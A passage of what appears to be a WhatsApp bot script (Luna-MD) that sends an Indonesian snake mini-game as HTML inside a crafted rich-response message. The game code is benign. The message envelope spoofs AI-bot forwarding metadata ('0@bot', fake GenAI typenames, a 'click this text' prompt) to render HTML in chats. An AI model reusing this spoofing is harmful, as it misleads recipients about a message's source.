          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
);
}
break

case "snake-rimba": { 
const html = `
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<meta name="theme-color" content="#111314">
<title>Luna-MD mini game</title>
<style>
:root{--bg:#111314;--wood:#d4b48f;--text:#ece7de;--dim:#95a1a8;--panel:#232d32;--panel2:#1a2225;--line:#3b4b54;--green:#8fb17a;--green2:#5c8650;--red:#e56a62;--gold:#d8b77f}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{min-height:100%;background:radial-gradient(900px 500px at 50% -10%,#2e3a3e 0%,var(--bg) 68%);color:var(--text);font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{display:flex;justify-content:center;align-items:center;padding:max(10px,env(safe-area-inset-top)) max(10px,env(safe-area-inset-right)) max(12px,env(safe-area-inset-bottom)) max(10px,env(safe-area-inset-left));overflow-x:hidden;touch-action:manipulation}
.app{width:min(100%,540px);margin:auto}
.console{width:100%;background:linear-gradient(180deg,#303b42,#1d2529);border:1px solid #42525b;border-radius:26px;padding:12px;box-shadow:0 30px 80px #000a,inset 0 1px 0 #ffffff14}
.head{display:flex;align-items:center;justify-content:space-between;gap:10px;background:#181e21;border:1px solid #344047;border-radius:15px;padding:9px 10px;margin-bottom:9px}
.brand{display:flex;align-items:center;gap:9px;min-width:0}.logo{width:38px;height:38px;flex:none;display:grid;place-items:center;border-radius:10px;background:radial-gradient(120% 120% at 30% 20%,#e9c9a0,#8d6e4a);color:#241a0b;font-size:21px;font-weight:950;box-shadow:0 4px 0 #5a3f28}.brandText{min-width:0}.title{font-family:Georgia,serif;font-size:16px;font-weight:900;letter-spacing:.2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.sub{margin-top:2px;color:var(--dim);font-size:8px;letter-spacing:.35px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.chips{display:grid;grid-template-columns:repeat(2,minmax(54px,1fr));gap:6px;flex:none}.chip{min-width:54px;padding:5px 7px;text-align:center;background:#1c2225;border:1px solid #35444c;border-radius:9px}.chip b{display:block;color:var(--dim);font-size:6.5px;letter-spacing:.13em}.chip span{display:block;margin-top:2px;color:var(--wood);font-size:13px;font-weight:900;line-height:1}
.arena{position:relative;width:100%;padding:7px;border:1px solid #2f3d44;border-radius:17px;background:#11171a;box-shadow:inset 0 12px 28px #000d;overflow:hidden}.canvasWrap{position:relative;width:100%;aspect-ratio:1/1;border-radius:11px;overflow:hidden;background:#1a2225}.canvasWrap canvas{display:block;width:100%;height:100%;background:#1a2225;image-rendering:auto;touch-action:none;user-select:none}.hint{position:absolute;left:9px;right:9px;top:9px;display:flex;justify-content:space-between;gap:8px;pointer-events:none}.badge{padding:5px 7px;border-radius:999px;background:#10181bd9;border:1px solid #ffffff12;color:#dce6e1;font-size:6.7px;font-weight:900;letter-spacing:.04em}.badge.gold{color:var(--wood)}
.overlay{position:absolute;inset:7px;border-radius:11px;display:grid;place-items:center;background:#0a0e0fcc;backdrop-filter:blur(10px);opacity:0;pointer-events:none;transition:opacity .2s ease}.overlay.show{opacity:1;pointer-events:auto}.modal{width:min(84%,320px);padding:20px 16px;text-align:center;border:1px solid #4d5e68;border-radius:16px;background:linear-gradient(180deg,#35444d,#242d32);box-shadow:0 18px 40px #0008}.modalIcon{font-size:30px;line-height:1}.modal h2{margin-top:7px;font-family:Georgia,serif;font-size:21px}.modal p{margin-top:5px;color:var(--dim);font-size:9px;line-height:1.45}.modal .miniRow{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px}.mini{padding:7px;border:1px solid #41515a;border-radius:8px;background:#1b2428}.mini b{display:block;color:var(--wood);font-size:13px}.mini span{display:block;margin-top:2px;color:var(--dim);font-size:6.4px;letter-spacing:.04em;text-transform:uppercase}
.ctrl{margin-top:9px;padding:10px;border:1px solid #3b4b54;border-radius:16px;background:linear-gradient(180deg,#28343a,#1f282d)}.ctrlTop{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:8px}.ctrlTop b{font-size:7px;letter-spacing:.13em;color:var(--dim)}.ctrlTop b:last-child{color:var(--wood)}
.actions{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:7px;margin-bottom:9px}.btn{min-height:41px;border:1px solid #53636a;border-radius:10px;background:linear-gradient(180deg,#3e4e56,#2b363c);color:var(--text);font:900 8px system-ui;letter-spacing:.04em;box-shadow:0 4px 0 #13191d,inset 0 1px 0 #ffffff1a;touch-action:manipulation;user-select:none}.btn.primary{background:linear-gradient(180deg,#9fc08b,#5c8650);border-color:#89aa78;color:#0f1a0e}.btn.active{transform:translateY(3px);box-shadow:0 1px 0 #13191d}.btn:focus-visible{outline:2px solid var(--wood);outline-offset:2px}
.dpadWrap{display:flex;justify-content:center}.dpad{position:relative;width:min(55vw,230px);height:min(55vw,230px);min-width:182px;min-height:182px;max-width:230px;max-height:230px;border-radius:50%;border:1px solid #3a4a53;background:radial-gradient(100% 100% at 50% 45%,#202a2f,#151c1f);box-shadow:inset 0 8px 20px #000b;touch-action:none}.pad{position:absolute;width:29%;height:29%;min-width:52px;min-height:52px;max-width:68px;max-height:68px;border:1px solid #5a6d79;border-radius:17px;display:grid;place-items:center;background:linear-gradient(180deg,#404f58,#28333a);color:#e3ebee;font-size:20px;font-weight:900;box-shadow:0 7px 0 #131a1e,0 12px 20px #0006,inset 0 1px 0 #ffffff1f;touch-action:manipulation;user-select:none;transition:transform .05s ease,background .05s ease}.pad.up{top:4.3%;left:50%;transform:translateX(-50%)}.pad.down{bottom:4.3%;left:50%;transform:translateX(-50%)}.pad.left{left:4.3%;top:50%;transform:translateY(-50%)}.pad.right{right:4.3%;top:50%;transform:translateY(-50%)}.pad.active{background:linear-gradient(180deg,#4a5d69,#323f47)}.pad.up.active,.pad.down.active{transform:translateX(-50%) translateY(4px) scale(.97)}.pad.left.active,.pad.right.active{transform:translateY(-50%) translateY(4px) scale(.97)}.centerDot{position:absolute;left:50%;top:50%;width:22%;height:22%;min-width:42px;min-height:42px;max-width:52px;max-height:52px;transform:translate(-50%,-50%);border-radius:50%;background:radial-gradient(100% at 30% 30%,#d4b48f,#7a5a36);border:1px solid #a68660;box-shadow:0 5px 0 #4a3a27,inset 0 1px 0 #ffffff80}
.footer{display:flex;justify-content:space-between;gap:8px;margin-top:7px;padding:0 3px;color:#6f7e84;font-size:6.5px}.footer span{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.footer kbd{padding:2px 4px;border:1px solid #37464d;border-radius:4px;background:#131a1d;color:#97a5aa;font:700 6px system-ui}
@media(max-width:380px){body{padding:7px}.console{padding:9px;border-radius:22px}.head{padding:8px;margin-bottom:7px}.logo{width:34px;height:34px;font-size:18px}.title{font-size:14px}.sub{font-size:7px}.chip{min-width:48px}.chip b{font-size:5.8px}.chip span{font-size:11px}.ctrl{padding:8px}.actions{gap:5px}.btn{min-height:38px;font-size:7px}.dpad{width:205px;height:205px}}
@media(min-width:700px){body{padding-top:20px;padding-bottom:20px}.console{padding:14px;border-radius:28px}}
</style>
</head>
<body>
<div class="app">
  <div class="console">
    <div class="head">
      <div class="brand">
        <div class="logo">S</div>
        <div class="brandText"><div class="title">ULAR RIMBA</div><div class="sub">QIRO AI MINI GAME</div></div>
      </div>
      <div class="chips">
        <div class="chip"><b>SKOR</b><span id="score">0</span></div>
        <div class="chip"><b>LEVEL</b><span id="level">1</span></div>
      </div>
    </div>
    <div class="arena">
      <div class="canvasWrap"><canvas id="game" width="720" height="720"></canvas>
        <div class="hint"><span class="badge" id="stateBadge">SIAP</span><span class="badge gold" id="bestBadge">BEST 0</span></div>
        <div class="overlay" id="overlay"><div class="modal"><div class="modalIcon" id="modalIcon">🐍</div><h2 id="modalTitle">Ular Rimba</h2><p id="modalText">Tekan MULAI untuk berburu.</p><div class="miniRow"><div class="mini"><b id="modalScore">0</b><span>Skor</span></div><div class="mini"><b id="modalBest">0</b><span>Best</span></div></div></div></div>
      </div>
    </div>
    <div class="ctrl">
      <div class="ctrlTop"><b>◈ KONTROL</b><b>© Luna-MD</b></div>
      <div class="actions"><button class="btn primary" id="startBtn" type="button">▶ MULAI</button><button class="btn" id="resetBtn" type="button">↻ ULANG</button></div>
      <div class="dpadWrap"><div class="dpad" id="dpad"><button class="pad up" data-dir="up" type="button" aria-label="Atas">▲</button><button class="pad down" data-dir="down" type="button" aria-label="Bawah">▼</button><button class="pad left" data-dir="left" type="button" aria-label="Kiri">◀</button><button class="pad right" data-dir="right" type="button" aria-label="Kanan">▶</button><div class="centerDot"></div></div></div>
      <div class="footer"><span>Geser layar atau gunakan tombol arah</span><span><kbd>WASD</kbd> <kbd>←↑↓→</kbd> <kbd>SPACE</kbd></span></div>
    </div>
  </div>
</div>
<script>
'use strict';
(()=>{
const canvas=document.getElementById('game'),ctx=canvas.getContext('2d',{alpha:false});
const scoreEl=document.getElementById('score'),levelEl=document.getElementById('level'),stateBadge=document.getElementById('stateBadge'),bestBadge=document.getElementById('bestBadge');
const overlay=document.getElementById('overlay'),modalIcon=document.getElementById('modalIcon'),modalTitle=document.getElementById('modalTitle'),modalText=document.getElementById('modalText'),modalScore=document.getElementById('modalScore'),modalBest=document.getElementById('modalBest');
const startBtn=document.getElementById('startBtn'),resetBtn=document.getElementById('resetBtn');
const GRID=20,CELL=canvas.width/GRID,BASE_SPEED=145,MIN_SPEED=78,LEVEL_SCORE=40;
let snake=[],prevSnake=[],dir={x:1,y:0},nextDir={x:1,y:0},inputQueue=[],fruit=null,score=0,best=0,running=false,paused=false,gameOver=false,speed=BASE_SPEED,accumulator=0,lastTime=0,visualAngle=0,targetAngle=0,bodyAngles=[],particles=[],tongue=0,pulse=0,swipeStart=null,trail=[],visualHead={x:10,y:10},lastTrailPoint={x:10,y:10};
const pattern=document.createElement('canvas');pattern.width=40;pattern.height=20;const pctx=pattern.getContext('2d');pctx.strokeStyle='rgba(0,0,0,.18)';pctx.lineWidth=.8;for(let x=0;x<40;x+=10){pctx.beginPath();pctx.moveTo(x,0);pctx.lineTo(x+5,10);pctx.lineTo(x+10,0);pctx.stroke();pctx.beginPath();pctx.moveTo(x,10);pctx.lineTo(x+5,20);pctx.lineTo(x+10,10);pctx.stroke()}const scaleTex=ctx.createPattern(pattern,'repeat');
try{best=Number(localStorage.getItem('qiro_ai_snake_best')||0)||0}catch{}
function cloneSnake(a){return a.map(s=>({x:s.x,y:s.y}))}
function safeBestSave(){try{localStorage.setItem('qiro_ai_snake_best',String(best))}catch{}}
function wrapDelta(d){if(d>GRID/2)return d-GRID;if(d<-GRID/2)return d+GRID;return d}
function normalizeCoord(v){return((v%GRID)+GRID)%GRID}
function spawnFruit(){let f,guard=0;do{f={x:Math.floor(Math.random()*GRID),y:Math.floor(Math.random()*GRID),type:Math.random()<.7?(Math.random()<.6?'apple':'banana'):'shroom'};guard++}while(snake.some(s=>s.x===f.x&&s.y===f.y)&&guard<500);return f}
function updateUi(){scoreEl.textContent=score;levelEl.textContent=Math.floor(score/LEVEL_SCORE)+1;bestBadge.textContent='BEST '+best;stateBadge.textContent=gameOver?'K.O':paused?'JEDA':running?'BERBURU':'SIAP';startBtn.textContent=gameOver?'▶ MULAI':paused?'▶ LANJUT':running?'Ⅱ JEDA':'▶ MULAI';modalScore.textContent=score;modalBest.textContent=best}
function show(title,text,icon='🐍'){modalIcon.textContent=icon;modalTitle.textContent=title;modalText.textContent=text;modalScore.textContent=score;modalBest.textContent=best;overlay.classList.add('show');updateUi()}
function hide(){overlay.classList.remove('show')}
function reset(){snake=[{x:10,y:10},{x:9,y:10},{x:8,y:10}];prevSnake=cloneSnake(snake);dir={x:1,y:0};nextDir={x:1,y:0};inputQueue=[];fruit=spawnFruit();score=0;speed=BASE_SPEED;accumulator=0;running=false;paused=false;gameOver=false;visualAngle=0;targetAngle=0;bodyAngles=[0,0,0];particles=[];tongue=0;visualHead={x:10,y:10};trail=[{x:10,y:10},{x:9.2,y:10},{x:8.4,y:10},{x:7.6,y:10}];lastTrailPoint={x:10,y:10};hide();updateUi();draw(0)}
function start(){if(gameOver){reset()}if(running)return;paused=false;running=true;hide();lastTime=performance.now();accumulator=0;updateUi()}
function togglePause(){if(gameOver){reset();start();return}if(!running){start();return}paused=!paused;if(!paused){lastTime=performance.now();accumulator=0;hide()}else show('Jeda','Tekan LANJUT untuk kembali berburu.','⏸️');updateUi()}
function endGame(){if(gameOver)return;gameOver=true;running=false;paused=false;if(score>best){best=score;safeBestSave()}stateBadge.textContent='K.O';show('Ular Tumbang','Skor '+score+' • Best '+best+' • Tekan ULANG.','💥')}
function setDirection(x,y){const last=inputQueue.length?inputQueue[inputQueue.length-1]:nextDir;if(last.x===-x&&last.y===-y)return;if(last.x===x&&last.y===y)return;if(inputQueue.length<4)inputQueue.push({x,y});targetAngle=Math.atan2(y,x);if(!running&&!gameOver)start()}
function logicTick(){prevSnake=cloneSnake(snake);if(inputQueue.length){nextDir=inputQueue.shift()}dir=nextDir;targetAngle=Math.atan2(dir.y,dir.x);let h={x:snake[0].x+dir.x,y:snake[0].y+dir.y};if(h.x<0)h.x=GRID-1;if(h.x>=GRID)h.x=0;if(h.y<0)h.y=GRID-1;if(h.y>=GRID)h.y=0;const tailCanMove=h.x===snake[snake.length-1]?.x&&h.y===snake[snake.length-1]?.y;const bodyHit=snake.some((s,i)=>i<snake.length-1&&!tailCanMove&&s.x===h.x&&s.y===h.y)||snake.slice(0,-1).some(s=>s.x===h.x&&s.y===h.y);if(bodyHit){endGame();return}snake.unshift(h);bodyAngles.unshift(targetAngle);if(h.x===fruit.x&&h.y===fruit.y){const gain=fruit.type==='apple'?10:fruit.type==='banana'?20:50;score+=gain;tongue=10;burst(h.x*CELL+CELL/2,h.y*CELL+CELL/2,fruit.type);fruit=spawnFruit();speed=Math.max(MIN_SPEED,BASE_SPEED-Math.floor(score/50)*4);if(score>best){best=score;safeBestSave()}}else{snake.pop();bodyAngles.pop()}updateUi()}
function burst(x,y,type){for(let i=0;i<14;i++){const a=Math.random()*Math.PI*2,v=1.4+Math.random()*3.2;particles.push({x,y,vx:Math.cos(a)*v,vy:Math.sin(a)*v-1.2,life:20+Math.random()*10,max:30,type})}}
function unwrapTarget(prev,curr){let d=curr-prev;if(d>GRID/2)curr-=GRID;if(d<-GRID/2)curr+=GRID;return curr}
function trailPointAt(distance){if(!trail.length)return{x:visualHead.x,y:visualHead.y};let remain=distance;for(let i=0;i<trail.length-1;i++){const a=trail[i],b=trail[i+1];const dx=wrapDelta(b.x-a.x),dy=wrapDelta(b.y-a.y);const len=Math.hypot(dx,dy);if(len<=0)continue;if(remain<=len){const q=remain/len;return{x:normalizeCoord(a.x+dx*q),y:normalizeCoord(a.y+dy*q)}}remain-=len}const z=trail[trail.length-1];return{x:normalizeCoord(z.x),y:normalizeCoord(z.y)}}
function drawWrappedSegment(x,y,r,i,angle,alpha=1){const cx=x*CELL+CELL/2,cy=y*CELL+CELL/2,canvasSize=canvas.width,extent=r*1.45+2,wrapPx=GRID*CELL;for(let ox=-1;ox<=1;ox++){for(let oy=-1;oy<=1;oy++){const px=cx+ox*wrapPx,py=cy+oy*wrapPx;if(px+extent<0||px-extent>canvasSize||py+extent<0||py-extent>canvasSize)continue;snakeDraw(px,py,r,i,angle,alpha)}}}
function angleBetween(a,b,fallback=0){const dx=wrapDelta(b.x-a.x),dy=wrapDelta(b.y-a.y);return Math.hypot(dx,dy)>.001?Math.atan2(dy,dx):fallback}
function snakeDraw(x,y,r,i,angle,alpha=1){ctx.save();ctx.globalAlpha=alpha;ctx.translate(x,y);ctx.rotate(angle);ctx.fillStyle='rgba(0,0,0,.38)';ctx.beginPath();ctx.ellipse(3,7,r,r*.6,0,0,Math.PI*2);ctx.fill();const grad=ctx.createLinearGradient(-r,-r*.8,r,r*.8);if(i===0){grad.addColorStop(0,'#e2f0c8');grad.addColorStop(.35,'#8fb17a');grad.addColorStop(1,'#1e2f18')}else{const sh=Math.max(.62,1-i*.02);grad.addColorStop(0,'rgba('+Math.round(110*sh)+','+Math.round(150*sh)+','+Math.round(90*sh)+',1)');grad.addColorStop(.5,'rgba(65,95,52,1)');grad.addColorStop(1,'rgba(28,42,22,1)')}ctx.fillStyle=grad;ctx.beginPath();ctx.ellipse(0,0,r*1.22,r*.9,0,0,Math.PI*2);ctx.fill();if(scaleTex){ctx.fillStyle=scaleTex;ctx.globalAlpha=alpha*.32;ctx.beginPath();ctx.ellipse(0,0,r*1.15,r*.82,0,0,Math.PI*2);ctx.fill();ctx.globalAlpha=alpha}ctx.fillStyle='rgba(230,214,160,.2)';ctx.beginPath();for(let xx=-r*1.1;xx<r*1.1;xx+=4)ctx.rect(xx,r*.32+Math.sin(xx*.8+i)*1.2,2.5,2);ctx.fill();if(i&&i%3===0){ctx.fillStyle='rgba(12,22,10,.48)';ctx.beginPath();ctx.ellipse(0,0,6,4.5,0,0,Math.PI*2);ctx.fill()}if(i===0){ctx.fillStyle='#0e1710';ctx.beginPath();ctx.ellipse(r*.35,-r*.42,3.8,5.2,0,0,Math.PI*2);ctx.ellipse(r*.35,r*.42,3.8,5.2,0,0,Math.PI*2);ctx.fill();ctx.fillStyle='#ffeb3b';ctx.beginPath();ctx.arc(r*.58,-r*.42,1.4,0,Math.PI*2);ctx.arc(r*.58,r*.42,1.4,0,Math.PI*2);ctx.fill();ctx.fillStyle='#000';ctx.beginPath();ctx.ellipse(r*.35,-r*.42,1.1,2.4,0,0,Math.PI*2);ctx.ellipse(r*.35,r*.42,1.1,2.4,0,0,Math.PI*2);ctx.fill();if(tongue>0){ctx.strokeStyle='#ff3434';ctx.lineWidth=2.2;ctx.lineCap='round';ctx.beginPath();ctx.moveTo(r*1.18,0);ctx.lineTo(r*1.18+11,-3);ctx.moveTo(r*1.18,0);ctx.lineTo(r*1.18+11,3);ctx.stroke()}}ctx.fillStyle='rgba(255,255,255,.17)';ctx.beginPath();ctx.ellipse(-r*.28,-r*.35,r*.55,r*.28,0,0,Math.PI*2);ctx.fill();ctx.restore()}
function drawFruit(){const fx=fruit.x*CELL+CELL/2,fy=fruit.y*CELL+CELL/2,p=.8+Math.sin(performance.now()/250)*.08;ctx.fillStyle='rgba(0,0,0,.45)';ctx.beginPath();ctx.ellipse(fx+3,fy+10,10,5,0,0,Math.PI*2);ctx.fill();const fg=ctx.createRadialGradient(fx-4,fy-6,2,fx,fy,14);if(fruit.type==='apple'){fg.addColorStop(0,'#ffb2b2');fg.addColorStop(1,'#8f1d1d')}else if(fruit.type==='banana'){fg.addColorStop(0,'#fff2a0');fg.addColorStop(1,'#b78a00')}else{fg.addColorStop(0,'#c5e8b0');fg.addColorStop(1,'#314d26')}ctx.save();ctx.translate(fx,fy);ctx.scale(p,p);ctx.fillStyle=fg;ctx.beginPath();if(fruit.type==='banana'){ctx.ellipse(0,0,14,9,-.32,0,Math.PI*2);ctx.fill()}else{ctx.arc(0,0,12,0,Math.PI*2);ctx.fill()}if(fruit.type==='apple'){ctx.fillStyle='#3c2918';ctx.fillRect(-1,-14,3,5)}if(fruit.type==='shroom'){ctx.fillStyle='#5b7440';ctx.fillRect(-1,-14,2,6)}ctx.restore()}
function draw(t){ctx.fillStyle='#1b2225';ctx.fillRect(0,0,canvas.width,canvas.height);for(let y=0;y<GRID;y++)for(let x=0;x<GRID;x++){ctx.fillStyle=(x+y)%2?'#1e272b':'#1b2225';ctx.fillRect(x*CELL,y*CELL,CELL,CELL)}drawFruit();const headPrev=prevSnake[0]||snake[0];const headCurr=snake[0];let tx=unwrapTarget(headPrev.x,headCurr.x),ty=unwrapTarget(headPrev.y,headCurr.y);visualHead={x:normalizeCoord(headPrev.x+(tx-headPrev.x)*t),y:normalizeCoord(headPrev.y+(ty-headPrev.y)*t)};if(Math.hypot(wrapDelta(visualHead.x-lastTrailPoint.x),wrapDelta(visualHead.y-lastTrailPoint.y))>=.035){trail.unshift({x:visualHead.x,y:visualHead.y});lastTrailPoint={x:visualHead.x,y:visualHead.y}}const maxTrail=Math.max(24,Math.ceil(snake.length*CELL*.92/.6)+12);if(trail.length>maxTrail)trail.length=maxTrail;for(let i=snake.length-1;i>=0;i--){const p=trailPointAt(i*.92);const q=trailPointAt(Math.max(0,i*.92-.55));const ang=i===0?visualAngle:angleBetween(p,q,bodyAngles[i]??visualAngle);drawWrappedSegment(p.x,p.y,CELL*.46,i,ang,1)}if(isFinite(t))for(const p of particles){p.x+=p.vx;p.y+=p.vy;p.vy+=.14;p.life-=1;ctx.globalAlpha=Math.max(0,p.life/p.max);ctx.fillStyle=p.type==='apple'?'#ff6b6b':p.type==='banana'?'#ffd166':'#8fb17a';ctx.beginPath();ctx.arc(p.x,p.y,3.6,0,Math.PI*2);ctx.fill();ctx.globalAlpha=1}particles=particles.filter(p=>p.life>0);if(tongue>0&&running)tongue--}
function frame(now){requestAnimationFrame(frame);if(!lastTime)lastTime=now;const dt=Math.min(40,Math.max(0,now-lastTime));lastTime=now;pulse=now;if(running&&!paused&&!gameOver){accumulator+=dt;while(accumulator>=speed){logicTick();accumulator-=speed;if(gameOver)break}let d=targetAngle-visualAngle;while(d>Math.PI)d-=Math.PI*2;while(d<-Math.PI)d+=Math.PI*2;const turnEase=1-Math.exp(-dt*.032);visualAngle+=d*turnEase;for(let i=1;i<bodyAngles.length;i++){let q=bodyAngles[i-1]-bodyAngles[i];while(q>Math.PI)q-=Math.PI*2;while(q<-Math.PI)q+=Math.PI*2;bodyAngles[i]+=q*(1-Math.exp(-dt*.028))}}draw(running&&!paused&&!gameOver?Math.min(1,accumulator/speed):0)}
function bind(){startBtn.addEventListener('pointerdown',e=>{e.preventDefault();togglePause()},{passive:false});resetBtn.addEventListener('pointerdown',e=>{e.preventDefault();reset();show('Siap','Tekan MULAI untuk memulai.','🐍')},{passive:false});document.querySelectorAll('.pad').forEach(btn=>{const press=e=>{e.preventDefault();btn.classList.add('active');const d=btn.dataset.dir;if(d==='up')setDirection(0,-1);else if(d==='down')setDirection(0,1);else if(d==='left')setDirection(-1,0);else setDirection(1,0)};const release=()=>btn.classList.remove('active');btn.addEventListener('pointerdown',press,{passive:false});btn.addEventListener('pointerup',release);btn.addEventListener('pointercancel',release);btn.addEventListener('pointerleave',release)});document.addEventListener('keydown',e=>{const k=e.key.toLowerCase();if(k===' '){e.preventDefault();togglePause();return}if(k==='r'){e.preventDefault();reset();show('Siap','Tekan MULAI untuk memulai.','🐍');return}if(k==='w'||k==='arrowup')setDirection(0,-1);else if(k==='s'||k==='arrowdown')setDirection(0,1);else if(k==='a'||k==='arrowleft')setDirection(-1,0);else if(k==='d'||k==='arrowright')setDirection(1,0)},{passive:false});canvas.addEventListener('pointerdown',e=>{swipeStart={x:e.clientX,y:e.clientY}},{passive:true});canvas.addEventListener('pointerup',e=>{if(!swipeStart)return;const dx=e.clientX-swipeStart.x,dy=e.clientY-swipeStart.y;swipeStart=null;if(Math.max(Math.abs(dx),Math.abs(dy))<18)return;if(Math.abs(dx)>Math.abs(dy))setDirection(dx>0?1:-1,0);else setDirection(0,dy>0?1:-1)},{passive:true});document.addEventListener('visibilitychange',()=>{if(document.hidden&&running&&!paused){paused=true;show('Jeda','Game dijeda otomatis saat layar ditinggalkan.','⏸️');updateUi()}})}
reset();show('Ular Rimba','Tekan MULAI untuk berburu.','🐍');bind();requestAnimationFrame(frame);
})();
\n/* RIMURU LIGHT SFX: procedural WebAudio, no external audio asset */
(function(){
  if (window.__RIMURU_LIGHT_SFX__) return;
  var ac=null, master=null, last=0;
  function init(){
    try{
      if(!ac){
        var C=window.AudioContext||window.webkitAudioContext;
        if(!C) return null;
        ac=new C();
        master=ac.createGain();
        master.gain.value=0.055;
        master.connect(ac.destination);
      }
      if(ac.state==='suspended') ac.resume();
      return ac;
    }catch(_){ return null; }
  }
  function tone(freq,dur,type,vol,when){
    var c=init(); if(!c||!master) return;
    var now=c.currentTime+(when||0), o=c.createOscillator(), g=c.createGain();
    o.type=type||'sine';
    o.frequency.setValueAtTime(freq,now);
    g.gain.setValueAtTime(0.0001,now);
    g.gain.exponentialRampToValueAtTime(Math.max(0.0001,vol||0.12),now+0.008);
    g.gain.exponentialRampToValueAtTime(0.0001,now+(dur||0.07));
    o.connect(g); g.connect(master); o.start(now); o.stop(now+(dur||0.07)+0.015);
  }
  function cool(now){
    var t=Date.now(); if(t-last<now) return false; last=t; return true;
  }
  var api={
    init:init,
    tap:function(){ if(cool(28)) tone(520,0.045,'square',0.055); },
    move:function(){ if(cool(24)) tone(300,0.035,'triangle',0.045); },
    rotate:function(){ if(cool(24)) tone(430,0.05,'triangle',0.05); },
    drop:function(){ if(cool(20)) tone(180,0.055,'square',0.05); },
    score:function(){ if(cool(18)) { tone(660,0.055,'sine',0.055); tone(880,0.055,'sine',0.04,0.045); } },
    line:function(){ if(cool(35)) { tone(740,0.06,'sine',0.06); tone(1040,0.09,'sine',0.045,0.05); } },
    win:function(){ if(cool(60)) { tone(523,0.08,'sine',0.06); tone(659,0.08,'sine',0.05,0.07); tone(784,0.12,'sine',0.045,0.14); } },
    over:function(){ if(cool(60)) { tone(392,0.09,'sawtooth',0.055); tone(294,0.12,'sawtooth',0.04,0.08); } }
  };
  window.__RIMURU_LIGHT_SFX__=api;

  function num(el){
    var s=(el.textContent||'').replace(/,/g,'').match(/-?\d+(?:\.\d+)?/);
    return s?Number(s[0]):null;
  }
  function bindValue(el){
    var lastVal=num(el);
    var mo=new MutationObserver(function(){
      var n=num(el);
      if(n===null || lastVal===null){ lastVal=n; return; }
      if(n>lastVal){
        var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
        if(/line|combo|clear|level|stage/.test(id)) api.line(); else api.score();
      } else if(n<lastVal && /life|hp|health|lives|heart/.test(((el.id||'')+' '+(el.className||'')).toLowerCase())) api.over();
      lastVal=n;
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true});
  }
  function bindState(el){
    var prev=(el.textContent||'').toLowerCase(), prevCls=el.className||'';
    var mo=new MutationObserver(function(){
      var txt=(el.textContent||'').toLowerCase(), cls=el.className||'';
      var joined=txt+' '+cls.toLowerCase();
      if(joined!==prev+' '+prevCls.toLowerCase()){
        if(/game over|gameover|kalah|selesai|you lose|lose|mati|gagal|over/.test(joined)) api.over();
        else if(/menang|menang!|you win|winner|victory|berhasil|selamat/.test(joined)) api.win();
        prev=txt; prevCls=cls;
      }
    });
    mo.observe(el,{subtree:true,childList:true,characterData:true,attributes:true,attributeFilter:['class','style','hidden','aria-hidden']});
  }
  document.addEventListener('pointerdown',function(){ api.init(); api.tap(); },{passive:true,capture:true});
  document.addEventListener('keydown',function(e){
    api.init();
    var k=e.key;
    if(/^Arrow(Left|Right|Up|Down)$/.test(k) || /^(a|d|w|s)$/i.test(k)) api.move();
    else if(k===' ' || k==='Enter') api.tap();
  },{passive:true,capture:true});
  document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  });
  if(document.readyState!=='loading'){
    document.querySelectorAll('[id]').forEach(function(el){
      var id=((el.id||'')+' '+(el.className||'')).toLowerCase();
      if(/score|points|lines|combo|level|stage|best|coin/.test(id)) bindValue(el);
      if(/over|result|status|message|state|win|lose|modal/.test(id)) bindState(el);
    });
  }
})();
</script>
</body>
</html>
`;

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
